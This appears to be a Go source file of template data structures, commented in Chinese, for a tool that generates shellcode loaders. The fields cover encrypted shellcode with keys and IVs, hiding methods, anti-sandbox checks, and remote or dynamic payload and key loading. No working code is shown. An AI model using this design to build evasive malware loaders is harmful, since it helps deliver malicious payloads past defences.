package render

type TmplOpts struct {
	TmplFile     string      // 模板文件路径
	OutputDir    string      // 输出目录路径
	OutputGoName string      // 输出的 Go 文件名
	Data         interface{} // 基础模板渲染数据
}

type Data struct {
	CipherText    string      // 保存加密文本的变量名
	PlainText     string      // 保存解密文本的变量名
	DecryptMethod string      // 解密方法
	Pokemon       interface{} // Pokemon Shellcode
	Loader        interface{} // loader
	SandBox       interface{} // 反沙箱模块
	Local         interface{} // 本地加载模块
	Remote        interface{} // 远程加载模块
	Args          interface{} // 参数加载模块
	Compressor    interface{} // 压缩算法模块
	Apart         interface{} // 分离加载模块
	Dynamic       interface{} // 动态数据
}

type Loader struct {
	Method string // loader
	Hide   string // 隐藏方法
}

type SandBox struct {
	Import  string   // 导入库
	Methods []string // 反沙箱方法, 批量渲染
}

type Compressor struct {
	Import    string // 导入库
	Algorithm string // 压缩算法
	Ratio     int    // lzw 压缩率, 一般为8
}

type Local struct {
	KeyName  string      // Key 变量名
	KeyValue string      // Key 值
	IvName   string      // Iv  变量名
	IvValue  string      // Iv  值
	Payload  interface{} // 加密 shellcode
}

type Remote struct {
	Import     string // 导入库
	Url        string // 远程加载Url
	Method     string // 请求方法
	UCFileCode string // UsersCloud加载的参数
	UCMethod   string // 读取UsersCloud的Payload
}

type Dynamic struct {
	Import        string // 导入库
	DynamicUrl    string // 动态获取 Key
	DynamicMethod string // 动态函数
	KeyName       string // Key 变量名
	DynamicKey    string // 动态获取 Key
	KeyStart      int    // Key 动态区间
	KeyEnd        int    // Key 动态区间
	IVName        string // IV 变量名
	DynamicIV     string // 动态获取 IV
	IVStart       int    // IV 动态区间
	IVEnd         int    // IV 动态区间
}

type Args struct {
	Import  string // 导入库
	ArgsKey string // 参数加载设置的密钥
}
